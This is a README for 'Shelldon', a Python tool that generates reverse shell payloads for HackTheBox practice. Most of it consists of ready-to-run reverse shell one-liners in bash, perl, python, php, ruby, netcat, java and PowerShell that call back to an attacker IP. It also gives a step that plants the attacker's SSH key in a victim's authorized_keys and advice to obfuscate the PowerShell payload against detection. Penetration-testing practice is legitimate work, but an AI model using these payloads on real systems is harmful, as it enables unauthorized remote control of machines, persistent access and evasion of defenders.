# Shelldon
Shelldon is a simple python tool for generating customizable reverse shell payloads with very little effort.

This is a tool I developed while working on HackTheBox machines for convenience. Instead of heading over to https://web.archive.org/web/20180426234913/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet every 5 minutes, changing the IP address, and having a time-consuming headache, I created this program.

Once properly configured, you can generate the command for a python reverse-shell (with the correct IP address) as simply as `shelldon python`. This program is extremely basic, so feel free to improve it on your own time. I'm not interested in actively maintaining this, however I'm open to making improvements to it.

# Installation
All you really need is python3.
```
git clone https://github.com/ChefByzen/Shelldon.git
apt-get install python3 -y
chmod +x $(locate shelldon.py)
ln -s $(locate shelldon.py) /usr/local/sbin/shelldon
```

The following command is given for clipboard functionality and convenience.
```
apt-get install xclip -y
echo 'alias pbcopy='xclip -selection clipboard' >> ~/.bashrc
echo 'alias pbpaste='xclip -selection clipboard' >> ~/.bashrc
```

# Optional Configuration
If you would like to use Shelldon outside of HackTheBox, be sure to specify your main network interface (check your `ifconfig` output) in the shelldon.conf file.
```
[INIT]
config = htb

[default]
interface = eth0
port = 53
linuxcmd = /bin/sh
windowscmd = cmd.exe

[htb]
interface = tun0
port = 53
linuxcmd = /bin/sh
windowscmd = cmd.exe
```
The `INIT.config` option tells shelldon which configuration to use. This value can be edited either manually or with the `shelldon configuration` command.

The `.interface` option tells shelldon where to look for your current IP address. Because HackTheBox IPs change every day, shelldon will look at the tun0 interface and find your IP address. Thus when running shelldon, you don't need to type it out.

The `.port` option tells shelldon what port you prefer to listen on for your reverse shells.

The `.linuxcmd` option is the location of the interactive shell you'd like to send. Ex. `nc -e /bin/sh 10.0.0.1 53`

The `.windowscmd` option is what will be used instead if the -w option is specified. Ex. `nc.exe -e cmd.exe 10.0.0.1 53`

# Usage
```
root@kali:/opt/shelldon# shelldon --help
usage: shelldon [-h] [-c COMMAND] [-i IP] [-p PORT] [-a] [-w] [-y] [-e {single,double,both}] method

Generate a customizable reverse shell with little effort!

positional arguments:
  method                (configure, bash, perl, python, php, ruby, nc, java, powershell, ssh)

optional arguments:
  -h, --help            show this help message and exit
  -c COMMAND            Non-regular name of program (Ex. nc.exe)
  -i IP, --ip IP        Listening ip address
  -p PORT, --port PORT  Listening port
  -a, --alternate       Alternate functionality
  -w, --windows         Runs cmd.exe instead of /bin/sh
  -y, --clipboard       Saves command to clipboard instead of printing
  -e {single,double,both}, --escape {single,double,both}
                        Escapes single or double quotes. Useful for pasting

Thanks, Shelldon!
```

# Methods
## Configure
```
root@kali:/opt/shelldon# shelldon configure
Possible configurations: ['default', 'htb']
Enter new initial configuration: htb
Initial configuration changed to htb (was default)
```
The configure method allows you to change the initial configuration (located in the shelldon.conf file) used.

## Bash
```
root@kali:/opt/shelldon# shelldon bash
/bin/sh -i >& /dev/tcp/10.0.0.1/53 0>&1
```
- **No COMMAND funcionality**
- **No --alternate funcionality**

## Perl
```
root@kali:/opt/shelldon# shelldon perl
perl -e 'use Socket;$i="10.0.0.1";$p=53;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
- **Default COMMAND: perl**
- **No --alternate functionality**

## Python
```
root@kali:/opt/shelldon# shelldon python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",53));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
- **Default COMMAND: python3**
- Note that because python2.7 is deprecated, it is likely you will need to specify the exact path with -c
- Ex: `root@kali:/opt/shelldon# shelldon python -c /usr/bin/python3.8`

## Python --alternate
```
root@kali:/opt/shelldon# shelldon python -a
export TERM=screen-256color;python3 -c 'import pty;pty.spawn("/bin/bash")';
```
- **Default COMMAND: python3**
- This is not a reverse shell, this is a pretty shell. I recommend typing `<CTRL+Z>stty raw -echo;fg<ENTER>` to make it fully interactive.
- The TERM part is not necessary, I just prefer color.

## PHP
```
root@kali:/opt/shelldon# shelldon php
php -r '$sock=fsockopen("10.0.0.1",53);exec("/bin/sh -i <&3 >&3 2>&3");'
```
- **Default COMMAND: php**
- This is not a webshell. For php webshells, please refer to the /usr/share/webshells/php/ folder on Kali Linux.
- **No --alternate functionality**

## Ruby
```
root@kali:/opt/shelldon# shelldon ruby
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",53).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```
- **Default COMMAND: ruby**
- **No --alternate functionality**

## Netcat
```
root@kali:/opt/shelldon# shelldon nc
nc -e /bin/sh 10.0.0.1 53
```
- **Default COMMAND: nc**
- Only works with netcat-traditional

## Netcat --alternate
```
root@kali:/opt/shelldon# shelldon nc -a
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 53 >/tmp/f
```
- **Default COMMAND: nc**
- Used for netcat-openbsd (which is the default installation for most linux servers)

## Java
```
root@kali:/opt/shelldon# shelldon java
r = Runtime.getRuntime()
p = r.exec(["/bin/sh","-c","exec 5<>/dev/tcp/10.0.0.1/53;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
- **No COMMAND funcionality**
- **No --alternate functionality**

## Powershell
```
root@kali:/opt/shelldon# shelldon powershell
powershell.exe -c "$client = New-Object System.Ns.TCPClient('10.0.0.1',53);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
- **Default COMMAND: powershell.exe**
- While I could not automate the process, I suggest using Invoke-Obfuscation to obfuscate this.

## Powershell --alternate
```
root@kali:/opt/shelldon# shelldon powershell -a
powershell.exe -c "$sm=(New-Object Net.Sockets.TCPClient('10.0.0.1',53)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}"
```
- **Default COMMAND: powershell.exe**

## SSH
```
root@kali:/opt/shelldon# shelldon ssh
echo 'ssh-rsa XXXXXXXXX root@kali' >> \
```
- **No COMMAND functionality**
- This is not a reverse shell. This command grabs the contents of your `$HOME/.ssh/id_rsa.pub` file and puts it into this convenient open-ended echo command.
- When pasting this command over to your victim, you will need to type in the path for their `~/.ssh/authorized_keys` file. This will allow you to ssh in as the victim with `ssh -i ~/.ssh/id_rsa victim@box.htb`
- **No --alternate functionality**

